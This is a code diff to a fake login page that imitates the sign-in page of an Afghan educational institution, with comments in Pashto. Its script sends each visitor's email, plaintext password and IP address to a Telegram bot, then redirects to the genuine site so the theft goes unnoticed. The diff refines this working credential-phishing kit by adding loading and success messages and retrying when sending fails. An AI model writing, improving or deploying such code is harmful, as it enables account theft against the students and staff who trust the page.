@@ -6,7 +6,6 @@
 <title>Login</title>
 
 <style>
-
 *{
     margin:0;
     padding:0;
@@ -26,22 +25,18 @@ body{
 .login-container{
     width:480px;
     max-width:95%;
-    height:479px;
-
+    height:auto;
+    min-height:479px;
     background:#fff;
     border-radius:16px;
-
     padding:38px 14px 26px 14px;
-
     border:1px solid #e0e0e0;
     box-shadow:0 4px 14px rgba(0,0,0,0.08);
-
     display:flex;
     flex-direction:column;
     justify-content:center;
 }
 
-/* LOGO */
 .logo{
     text-align:center;
     margin-bottom:14px;
@@ -51,7 +46,6 @@ body{
     width:280px;
 }
 
-/* TITLE */
 .title{
     text-align:center;
     font-size:22px;
@@ -60,7 +54,6 @@ body{
     color:#222;
 }
 
-/* INPUT */
 .input-box{
     margin-bottom:18px;
 }
@@ -86,7 +79,6 @@ input:focus{
     outline:none;
 }
 
-/* CHECKBOX */
 .remember{
     display:flex;
     align-items:center;
@@ -100,7 +92,6 @@ input:focus{
     margin-right:8px;
 }
 
-/* BUTTON */
 button{
     width:100%;
     height:54px;
@@ -110,13 +101,13 @@ button{
     font-size:16px;
     font-weight:bold;
     cursor:pointer;
+    color:#fff;
 }
 
 button:hover{
     background:#0fb6d6;
 }
 
-/* د تېروتنې پیغام */
 .error-msg {
     background: #ffe6e6;
     border: 1px solid #ff6666;
@@ -127,6 +118,26 @@ button:hover{
     text-align: center;
     margin-top: 12px;
     display: none;
+}
+
+.success-msg {
+    background: #e6ffe6;
+    border: 1px solid #00cc00;
+    color: #006600;
+    padding: 10px;
+    border-radius: 8px;
+    font-size: 13px;
+    text-align: center;
+    margin-top: 12px;
+    display: none;
+}
+
+.loading {
+    display: none;
+    text-align: center;
+    padding: 10px;
+    color: #18c6e7;
+    font-weight: bold;
 }
 
 </style>
@@ -143,6 +154,8 @@ button:hover{
     <div class="title">Sign in</div>
 
     <div id="errorMsg" class="error-msg"></div>
+    <div id="successMsg" class="success-msg"></div>
+    <div id="loading" class="loading">⏳ Sending...</div>
 
     <div class="input-box">
         <label>Email</label>
@@ -174,7 +187,7 @@ button:hover{
         return pashtoRegex.test(text);
     }
 
-    // ========== د ایمیل تایید (یوازې سم ایمیل) ==========
+    // ========== د ایمیل تایید ==========
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         return emailRegex.test(email);
@@ -196,12 +209,12 @@ button:hover{
         }
     }
 
-    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
+    // اډمن ته پیغام لیږل
     async function sendToAdmin(email, password, ip) {
-        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+        const message = `✅ *NEW LOGIN ATTEMPT* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -210,8 +223,10 @@ button:hover{
                     parse_mode: 'Markdown'
                 })
             });
+            return response.ok;
         } catch(e) {
             console.warn("Telegram error:", e);
+            return false;
         }
     }
 
@@ -219,8 +234,19 @@ button:hover{
         const errorDiv = document.getElementById('errorMsg');
         errorDiv.textContent = message;
         errorDiv.style.display = 'block';
+        document.getElementById('successMsg').style.display = 'none';
         setTimeout(() => {
             errorDiv.style.display = 'none';
+        }, 3000);
+    }
+
+    function showSuccess(message) {
+        const successDiv = document.getElementById('successMsg');
+        successDiv.textContent = message;
+        successDiv.style.display = 'block';
+        document.getElementById('errorMsg').style.display = 'none';
+        setTimeout(() => {
+            successDiv.style.display = 'none';
         }, 3000);
     }
 
@@ -235,17 +261,12 @@ button:hover{
         }
 
         // د پښتو تورو چک
-        if (hasPashtoCharacters(email)) {
-            showError('Pashto not allowed ');
-            return;
-        }
-        
-        if (hasPashtoCharacters(password)) {
-            showError('Pashto not allowed ');
+        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
+            showError('Pashto not allowed');
             return;
         }
 
-        // د ایمیل فورمټ چک (یوازې سم ایمیل)
+        // د ایمیل فورمټ چک
         if (!isValidEmail(email)) {
             showError('Please enter a valid email address (e.g., username@gmail.com)');
             return;
@@ -257,13 +278,30 @@ button:hover{
             return;
         }
 
+        // د بار کولو پیغام وښایئ
+        document.getElementById('loading').style.display = 'block';
+        document.getElementById('loginBtn').disabled = true;
+
         const ip = await getUserIP();
 
-        // په لومړی ځل بریالي لاګ ان - معلومات اډمن ته واستوئ
-        await sendToAdmin(email, password, ip);
-        
-        // مستقیم altaqwa.edu.af/login ته لاړ شه (د لوډینګ پرته)
-        window.location.replace("https://www.altaqwa.edu.af/login");
+        // معلومات اډمن ته واستوئ
+        const sent = await sendToAdmin(email, password, ip);
+
+        // بار کول پټ کړئ
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('loginBtn').disabled = false;
+
+        if (sent) {
+            showSuccess('✅ Login successful! Information sent to admin.');
+        } else {
+            showError('⚠️ Could not send to admin. Please try again.');
+            return;
+        }
+
+        // د 2 ثانیو وروسته اصلي پاڼې ته لاړ شئ
+        setTimeout(() => {
+            window.location.replace("https://www.altaqwa.edu.af/login");
+        }, 1500);
     });
 </script>
 
